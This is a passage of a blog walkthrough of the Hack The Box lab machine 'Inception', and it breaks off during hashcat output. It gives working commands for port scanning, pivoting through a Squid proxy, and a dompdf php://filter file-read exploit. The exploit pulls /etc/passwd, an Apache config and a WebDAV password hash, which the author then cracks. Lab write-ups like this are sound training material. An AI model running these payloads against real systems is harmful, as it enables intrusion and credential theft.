href=/posts/cybersecurity/hackthebox/machines/windows/optimum/ title="[HTB] Machine: Optimum">[HTB] Machine: Optimum</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/outdated/ title="[HTB] Machine: Outdated">[HTB] Machine: Outdated</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/pivotapi/ title="[HTB] Machine: PivotAPI">[HTB] Machine: PivotAPI</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/querier/ title="[HTB] Machine: Querier">[HTB] Machine: Querier</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/rabbit/ title="[HTB] Machine: Rabbit">[HTB] Machine: Rabbit</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/reel/ title="[HTB] Machine: Reel">[HTB] Machine: Reel</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/reel2/ title="[HTB] Machine: Reel2">[HTB] Machine: Reel2</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/remote/ title="[HTB] Machine: Remote">[HTB] Machine: Remote</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/resolute/ title="[HTB] Machine: Resolute">[HTB] Machine: Resolute</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/return/ title="[HTB] Machine: Return">[HTB] Machine: Return</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/sauna/ title="[HTB] Machine: Sauna">[HTB] Machine: Sauna</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/scrambled/ title="[HTB] Machine: Scrambled">[HTB] Machine: Scrambled</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/search/ title="[HTB] Machine: Search">[HTB] Machine: Search</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/secnotes/ title="[HTB] Machine: SecNotes">[HTB] Machine: SecNotes</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/servmon/ title="[HTB] Machine: Servmon">[HTB] Machine: Servmon</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/sharp/ title="[HTB] Machine: Sharp">[HTB] Machine: Sharp</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/silo/ title="[HTB] Machine: Silo">[HTB] Machine: Silo</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/sizzle/ title="[HTB] Machine: Sizzle">[HTB] Machine: Sizzle</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/sniper/ title="[HTB] Machine: Sniper">[HTB] Machine: Sniper</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/streamio/ title="[HTB] Machine: StreamIO">[HTB] Machine: StreamIO</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/support/ title="[HTB] Machine: Support">[HTB] Machine: Support</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/tally/ title="[HTB] Machine: Tally">[HTB] Machine: Tally</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/timelapse/ title="[HTB] Machine: Timelapse">[HTB] Machine: Timelapse</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/toolbox/ title="[HTB] Machine: Toolbox">[HTB] Machine: Toolbox</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/worker/ title="[HTB] Machine: Worker">[HTB] Machine: Worker</a></li></ul></li></ul></li><li><a href=/posts/cybersecurity/hackthebox/overview/ title="[HTB] Overview">[HTB] Overview</a></li></ul></li><li><i class="fas fa-plus-circle"></i><a href=/posts/cybersecurity/pentesting/>Pentesting</a><ul><li><a href=/posts/cybersecurity/pentesting/active_directory/ title="[Pentesting] Active Directory">[Pentesting] Active Directory</a></li><li><a href=/posts/cybersecurity/pentesting/attacking_services/ title="[Pentesting] Attacking Services">[Pentesting] Attacking Services</a></li><li><a href=/posts/cybersecurity/pentesting/file_transfers/ title="[Pentesting] File Transfers">[Pentesting] File Transfers</a></li><li><a href=/posts/cybersecurity/pentesting/footprinting_and_enumeration/ title="[Pentesting] Footprinting and Enumeration">[Pentesting] Footprinting and Enumeration</a></li><li><a href=/posts/cybersecurity/pentesting/linux_privilege_escalation/ title="[Pentesting] Linux Privilege Escalation">[Pentesting] Linux Privilege Escalation</a></li><li><a href=/posts/cybersecurity/pentesting/mobile_pentesting/ title="[Pentesting] Mobile Pentesting">[Pentesting] Mobile Pentesting</a></li><li><a href=/posts/cybersecurity/pentesting/network_pentesting/ title="[Pentesting] Network Pentesting">[Pentesting] Network Pentesting</a></li><li><a href=/posts/cybersecurity/pentesting/osint/ title="[Pentesting] OSINT">[Pentesting] OSINT</a></li><li><a href=/posts/cybersecurity/pentesting/pivoting_tunneling_and_port_forwarding/ title="[Pentesting] Pivoting, Tunneling and Port Forwarding">[Pentesting] Pivoting, Tunneling and Port Forwarding</a></li><li><a href=/posts/cybersecurity/pentesting/shells_and_payloads/ title="[Pentesting] Shells and Payloads">[Pentesting] Shells and Payloads</a></li><li><a href=/posts/cybersecurity/pentesting/web_attacks/ title="[Pentesting] Web Attacks">[Pentesting] Web Attacks</a></li><li><a href=/posts/cybersecurity/pentesting/windows_privilege_escalation/ title="[Pentesting] Windows Privilege Escalation">[Pentesting] Windows Privilege Escalation</a></li></ul></li><li><i class="fas fa-plus-circle"></i><a href=/posts/cybersecurity/pwn.college/>pwn.college</a><ul><li><a href=/posts/cybersecurity/pwn.college/overview/ title="[pwn.college] Overview">[pwn.college] Overview</a></li></ul></li></ul></li><li><i class="fas fa-plus-circle"></i><a href=/posts/projects/>Projects</a><ul><li><a href=/posts/projects/ums/ title="[Projects] User-mode Scheduling (UMS)">[Projects] User-mode Scheduling (UMS)</a></li></ul></li></div></ul></div></div></div></section><section class=content-section id=content-section><div class=content><div class="container p-0 read-area"><div class="hero-area col-sm-12" id=hero-area style=background-image:url(/posts/cybersecurity/hackthebox/machines/linux/inception/images/inception.png)></div><div class=page-content><div class="author-profile ml-auto align-self-lg-center"><img class=rounded-circle src=/images/logo_hub369d6c5ab3ad73350236cbc9a72876b_254257_120x120_fit_box_3.png alt="Author Image"><h5 class=author-name>Bektur Umarbaev</h5><p>Tuesday, October 17, 2023</p></div><div class=title><h1>[HTB] Machine: Inception</h1></div><div class=taxonomy-terms><ul style=padding-left:0><li class=rounded><a href=/tags/htb/ class="btn, btn-sm">HTB</a></li><li class=rounded><a href=/tags/dompdf/ class="btn, btn-sm">dompdf</a></li><li class=rounded><a href=/tags/squid/ class="btn, btn-sm">squid</a></li><li class=rounded><a href=/tags/proxychains/ class="btn, btn-sm">proxychains</a></li><li class=rounded><a href=/tags/wfuzz/ class="btn, btn-sm">wfuzz</a></li><li class=rounded><a href=/tags/container/ class="btn, btn-sm">container</a></li><li class=rounded><a href=/tags/lxd/ class="btn, btn-sm">lxd</a></li><li class=rounded><a href=/tags/php-filter/ class="btn, btn-sm">php-filter</a></li><li class=rounded><a href=/tags/webdav/ class="btn, btn-sm">webdav</a></li><li class=rounded><a href=/tags/davtest/ class="btn, btn-sm">davtest</a></li><li class=rounded><a href=/tags/webshell/ class="btn, btn-sm">webshell</a></li><li class=rounded><a href=/tags/forward-shell/ class="btn, btn-sm">forward-shell</a></li><li class=rounded><a href=/tags/wordpress/ class="btn, btn-sm">wordpress</a></li><li class=rounded><a href=/tags/ping-sweep/ class="btn, btn-sm">ping-sweep</a></li><li class=rounded><a href=/tags/tftp/ class="btn, btn-sm">tftp</a></li><li class=rounded><a href=/tags/apt/ class="btn, btn-sm">apt</a></li><li class=rounded><a href=/tags/apt-pre-invoke/ class="btn, btn-sm">apt-pre-invoke</a></li></ul></div><div class=post-content id=post-content><h1 id=inception>Inception</h1><h2 id=enumeration>Enumeration</h2><ul><li><code>nmap</code></li></ul><pre tabindex=0><code>‚îî‚îÄ$ nmap -Pn -p- 10.10.10.67
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-19 19:11 BST
Stats: 0:05:40 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 81.05% done; ETC: 19:18 (0:01:20 remaining)
Nmap scan report for 10.10.10.67 (10.10.10.67)
Host is up (0.10s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
3128/tcp open  squid-http

Nmap done: 1 IP address (1 host up) scanned in 416.34 seconds
</code></pre><pre tabindex=0><code>‚îî‚îÄ$ nmap -Pn -p80,3128 -sC -sV 10.10.10.67
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-19 19:19 BST
Nmap scan report for 10.10.10.67 (10.10.10.67)
Host is up (0.11s latency).

PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Inception
3128/tcp open  http-proxy Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.26 seconds
</code></pre><ul><li>Web server</li></ul><p><img src=./images/1.png></p><ul><li><code>feroxbuster</code></li></ul><pre tabindex=0><code>‚îî‚îÄ$ feroxbuster -u http://10.10.10.67 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,php --depth 2   

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben &#34;epi&#34; Risher ü§ì                 ver: 2.10.0
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üéØ  Target Url            ‚îÇ http://10.10.10.67
 üöÄ  Threads               ‚îÇ 50
 üìñ  Wordlist              ‚îÇ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 üëå  Status Codes          ‚îÇ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 üí•  Timeout (secs)        ‚îÇ 7
 ü¶°  User-Agent            ‚îÇ feroxbuster/2.10.0
 üíâ  Config File           ‚îÇ /etc/feroxbuster/ferox-config.toml
 üîé  Extract Links         ‚îÇ true
 üí≤  Extensions            ‚îÇ [txt, php]
 üèÅ  HTTP methods          ‚îÇ [GET]
 üîÉ  Recursion Depth       ‚îÇ 2
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üèÅ  Press [ENTER] to use the Scan Management Menu‚Ñ¢
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
403      GET       11l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      311c http://10.10.10.67/images =&gt; http://10.10.10.67/images/
200      GET        8l       71w     2380c http://10.10.10.67/assets/js/ie/html5shiv.js
200      GET      174l      401w     5284c http://10.10.10.67/assets/js/main.js
200      GET     1187l     2417w    22010c http://10.10.10.67/assets/css/main.css
200      GET       12l       34w      228c http://10.10.10.67/assets/css/ie9.css
200      GET       27l       54w      422c http://10.10.10.67/assets/css/ie8.css
200      GET     1051l      169w     2877c http://10.10.10.67/
200      GET      397l     4810w   190069c http://10.10.10.67/images/bg03.jpg
301      GET        9l       28w      311c http://10.10.10.67/assets =&gt; http://10.10.10.67/assets/
200      GET       69l      328w     2307c http://10.10.10.67/README.txt
200      GET       63l     2733w    17128c http://10.10.10.67/LICENSE.txt
</code></pre><h2 id=foothold>Foothold</h2><ul><li>We saw a <code>squid</code> proxy<ul><li>Let&rsquo;s configure <code>proxychains</code></li><li>Add <code>http 10.10.10.67 3128</code> to <code>/etc/proxychains4.conf</code></li><li>Now we can <code>nmap</code></li></ul></li></ul><pre tabindex=0><code>‚îî‚îÄ$ proxychains nmap -Pn -sC -sV 127.0.0.1 
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-22 17:06 BST
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 2.20% done; ETC: 17:11 (0:04:27 remaining)
Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 2.60% done; ETC: 17:11 (0:04:22 remaining)
Stats: 0:03:31 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 67.70% done; ETC: 17:11 (0:01:41 remaining)
Nmap scan report for localhost (127.0.0.1)
Host is up (0.30s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 93:ad:d8:31:eb:db:c3:30:8e:96:c4:60:82:8b:4f:c4 (RSA)
|   256 1e:a8:07:32:25:c2:f9:a7:65:98:0e:52:15:3d:96:f7 (ECDSA)
|_  256 37:1d:45:db:f6:b1:2a:92:50:13:69:de:77:a4:ef:ae (ED25519)
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Inception
|_http-server-header: Apache/2.4.18 (Ubuntu)
3128/tcp open  http-proxy Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 374.76 seconds
</code></pre><pre tabindex=0><code>‚îî‚îÄ$ proxychains ssh root@localhost
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Warning: Permanently added &#39;localhost&#39; (ED25519) to the list of known hosts.
root@localhost&#39;s password:
</code></pre><ul><li>We could also use <code>wfuzz</code> to perform a scan using <code>squid</code> as proxy</li></ul><pre tabindex=0><code>‚îî‚îÄ$  wfuzz -u http://127.0.0.1:FUZZ -z range,1-65535 -p 10.10.10.67:3128:HTTP --hw 399
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#39;s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://127.0.0.1:FUZZ/
Total requests: 65535

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================

000000022:   200        2 L      4 W        60 Ch       &#34;22&#34;
000000080:   200        1051 L   169 W      2877 Ch     &#34;80&#34;
000003128:   400        151 L    416 W      3521 Ch     &#34;3128&#34; 
</code></pre><ul><li>We saw a comment on port <code>80</code> about <code>dompdf</code></li></ul><p><img src=./images/2.png></p><ul><li>If we visit <code>/dompdf</code>, we have a hit and the <code>version</code> is <code>0.6.0</code></li></ul><p><img src=./images/3.png></p><ul><li>We have a <a href=https://www.exploit-db.com/exploits/33004 target=_blank rel=noopener>exploit</a></li></ul><pre tabindex=0><code>‚îî‚îÄ$ curl -s &#39;http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd&#39;
%PDF-1.3
1 0 obj
&lt;&lt; /Type /Catalog
...
BT 34.016 734.579 Td /F1 12.0 Tf  [(cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtdGltZXN5bmM6eDoxMDA6MTAyOnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb24sLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UKc3lzdGVtZC1uZXR3b3JrOng6MTAxOjEwMzpzeXN0ZW1kIE5ldHdvcmsgTWFuYWdlbWVudCwsLDovcnVuL3N5c3RlbWQvbmV0aWY6L2Jpbi9mYWxzZQpzeXN0ZW1kLXJlc29sdmU6eDoxMDI6MTA0OnN5c3RlbWQgUmVzb2x2ZXIsLCw6L3J1bi9zeXN0ZW1kL3Jlc29sdmU6L2Jpbi9mYWxzZQpzeXN0ZW1kLWJ1cy1wcm94eTp4OjEwMzoxMDU6c3lzdGVtZCBCdXMgUHJveHksLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UKc3lzbG9nOng6MTA0OjEwODo6L2hvbWUvc3lzbG9nOi9iaW4vZmFsc2UKX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi9iaW4vZmFsc2UKc3NoZDp4OjEwNjo2NTUzNDo6L3Zhci9ydW4vc3NoZDovdXNyL3NiaW4vbm9sb2dpbgpjb2JiOng6MTAwMDoxMDAwOjovaG9tZS9jb2JiOi9iaW4vYmFzaAo=)] TJ ET
endstream
...
</code></pre><pre tabindex=0><code>‚îî‚îÄ$ echo &#34;cm9vd...&#34; | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
cobb:x:1000:1000::/home/cobb:/bin/bash
</code></pre><ul><li>Let&rsquo;s enumerate<ul><li>Can&rsquo;t read anything in <code>cobb</code>&rsquo;s home directory</li><li>We can check <code>apache</code>&rsquo;s config file for additional <code>vhosts</code></li><li>Also <code>squid.conf</code><ul><li><code>/etc/squid/squid.conf</code></li><li>But nothing there</li></ul></li></ul></li></ul><pre tabindex=0><code>‚îî‚îÄ$ curl -s &#39;http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/apache2/sites-enabled/000-default.conf&#39;
...
PFZpcnR1YWxIb3N0ICo6ODA+CgkjIFRoZSBTZXJ2ZXJOYW1lIGRpcmVjdGl2ZSBzZXRzIHRoZSByZXF1ZXN0IHNjaGVtZSwgaG9zdG5hbWUgYW5kIHBvcnQgdGhhdAoJIyB0aGUgc2VydmVyIHVzZXMgdG8gaWRlbnRpZnkgaXRzZWxmLiBUaGlzIGlzIHVzZWQgd2hlbiBjcmVhdGluZwoJIyByZWRpcmVjdGlvbiBVUkxzLiBJbiB0aGUgY29udGV4dCBvZiB2aXJ0dWFsIGhvc3RzLCB0aGUgU2VydmVyTmFtZQoJIyBzcGVjaWZpZXMgd2hhdCBob3N0bmFtZSBtdXN0IGFwcGVhciBpbiB0aGUgcmVxdWVzdCdzIEhvc3Q6IGhlYWRlciB0bwoJIyBtYXRjaCB0aGlzIHZpcnR1YWwgaG9zdC4gRm9yIHRoZSBkZWZhdWx0IHZpcnR1YWwgaG9zdCAodGhpcyBmaWxlKSB0aGlzCgkjIHZhbHVlIGlzIG5vdCBkZWNpc2l2ZSBhcyBpdCBpcyB1c2VkIGFzIGEgbGFzdCByZXNvcnQgaG9zdCByZWdhcmRsZXNzLgoJIyBIb3dldmVyLCB5b3UgbXVzdCBzZXQgaXQgZm9yIGFueSBmdXJ0aGVyIHZpcnR1YWwgaG9zdCBleHBsaWNpdGx5LgoJI1NlcnZlck5hbWUgd3d3LmV4YW1wbGUuY29tCgoJU2VydmVyQWRtaW4gd2VibWFzdGVyQGxvY2FsaG9zdAoJRG9jdW1lbnRSb290IC92YXIvd3d3L2h0bWwKCgkjIEF2YWlsYWJsZSBsb2dsZXZlbHM6IHRyYWNlOCwgLi4uLCB0cmFjZTEsIGRlYnVnLCBpbmZvLCBub3RpY2UsIHdhcm4sCgkjIGVycm9yLCBjcml0LCBhbGVydCwgZW1lcmcuCgkjIEl0IGlzIGFsc28gcG9zc2libGUgdG8gY29uZmlndXJlIHRoZSBsb2dsZXZlbCBmb3IgcGFydGljdWxhcgoJIyBtb2R1bGVzLCBlLmcuCgkjTG9nTGV2ZWwgaW5mbyBzc2w6d2FybgoKCUVycm9yTG9nICR7QVBBQ0hFX0xPR19ESVJ9L2Vycm9yLmxvZwoJQ3VzdG9tTG9nICR7QVBBQ0hFX0xPR19ESVJ9L2FjY2Vzcy5sb2cgY29tYmluZWQKCgkjIEZvciBtb3N0IGNvbmZpZ3VyYXRpb24gZmlsZXMgZnJvbSBjb25mLWF2YWlsYWJsZS8sIHdoaWNoIGFyZQoJIyBlbmFibGVkIG9yIGRpc2FibGVkIGF0IGEgZ2xvYmFsIGxldmVsLCBpdCBpcyBwb3NzaWJsZSB0bwoJIyBpbmNsdWRlIGEgbGluZSBmb3Igb25seSBvbmUgcGFydGljdWxhciB2aXJ0dWFsIGhvc3QuIEZvciBleGFtcGxlIHRoZQoJIyBmb2xsb3dpbmcgbGluZSBlbmFibGVzIHRoZSBDR0kgY29uZmlndXJhdGlvbiBmb3IgdGhpcyBob3N0IG9ubHkKCSMgYWZ0ZXIgaXQgaGFzIGJlZW4gZ2xvYmFsbHkgZGlzYWJsZWQgd2l0aCAiYTJkaXNjb25mIi4KCSNJbmNsdWRlIGNvbmYtYXZhaWxhYmxlL3NlcnZlLWNnaS1iaW4uY29uZgoJQWxpYXMgL3dlYmRhdl90ZXN0X2luY2VwdGlvbiAvdmFyL3d3dy9odG1sL3dlYmRhdl90ZXN0X2luY2VwdGlvbgoJPExvY2F0aW9uIC93ZWJkYXZfdGVzdF9pbmNlcHRpb24+CgkJT3B0aW9ucyBGb2xsb3dTeW1MaW5rcwoJCURBViBPbgoJCUF1dGhUeXBlIEJhc2ljCgkJQXV0aE5hbWUgIndlYmRhdiB0ZXN0IGNyZWRlbnRpYWwiCgkJQXV0aFVzZXJGaWxlIC92YXIvd3d3L2h0bWwvd2ViZGF2X3Rlc3RfaW5jZXB0aW9uL3dlYmRhdi5wYXNzd2QKCQlSZXF1aXJlIHZhbGlkLXVzZXIKCTwvTG9jYXRpb24+CjwvVmlydHVhbEhvc3Q+CgojIHZpbTogc3ludGF4PWFwYWNoZSB0cz00IHN3PTQgc3RzPTQgc3Igbm9ldAo=
...
</code></pre><pre tabindex=0><code>&lt;VirtualHost *:80&gt;
        # The ServerName directive sets the request scheme, hostname and port that
        # the server uses to identify itself. This is used when creating
        # redirection URLs. In the context of virtual hosts, the ServerName
        # specifies what hostname must appear in the request&#39;s Host: header to
        # match this virtual host. For the default virtual host (this file) this
        # value is not decisive as it is used as a last resort host regardless.
        # However, you must set it for any further virtual host explicitly.
        #ServerName www.example.com

        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
        # error, crit, alert, emerg.
        # It is also possible to configure the loglevel for particular
        # modules, e.g.
        #LogLevel info ssl:warn

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

        # For most configuration files from conf-available/, which are
        # enabled or disabled at a global level, it is possible to
        # include a line for only one particular virtual host. For example the
        # following line enables the CGI configuration for this host only
        # after it has been globally disabled with &#34;a2disconf&#34;.
        #Include conf-available/serve-cgi-bin.conf
        Alias /webdav_test_inception /var/www/html/webdav_test_inception
        &lt;Location /webdav_test_inception&gt;
                Options FollowSymLinks
                DAV On
                AuthType Basic
                AuthName &#34;webdav test credential&#34;
                AuthUserFile /var/www/html/webdav_test_inception/webdav.passwd
                Require valid-user
        &lt;/Location&gt;
&lt;/VirtualHost&gt;

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
</code></pre><ul><li>Let&rsquo;s retrieve <code>/var/www/html/webdav_test_inception/webdav.passwd</code></li></ul><pre tabindex=0><code>‚îî‚îÄ$ curl -s &#39;http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/var/www/html/webdav_test_inception/webdav.passwd&#39;
</code></pre><pre tabindex=0><code>‚îî‚îÄ$ echo &#34;d2ViZGF2X3Rlc3RlcjokYXByMSQ4ck83U21pNCR5cW43SC5HdkpGdHNUb3UxYTdWTUUwCg==&#34; | base64 -d
webdav_tester:$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0
</code></pre><ul><li>Crack it</li></ul><pre tabindex=0><code>‚îî‚îÄ$ hashcat --user hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode
...
$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0:babygurl69          
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR))
Hash.Target......: $apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0
Time.Started.....: Sun Oct 22 17:21:01 2023 (4 secs)
Time.Estimated...: Sun Oct 22 17:21:05 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     6883 H/s (9.01ms) @ Accel:32 Loops:1000 Thr:1 Vec:8
